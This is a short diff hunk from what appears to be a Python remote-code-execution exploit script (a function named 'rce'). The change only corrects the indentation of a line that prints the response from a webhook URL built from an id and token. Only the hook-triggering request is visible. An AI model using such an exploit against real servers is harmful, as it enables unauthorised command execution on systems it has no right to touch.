@@ -143,7 +143,7 @@ def rce(url,userid,token,cmd):
 	u = url + '/hooks/' + _id + '/' +token
 	r = requests.get(u)
 	res = json.loads(r.text)
-		print(res["message"])
+	print(res["message"])
 
 ############################################################
 
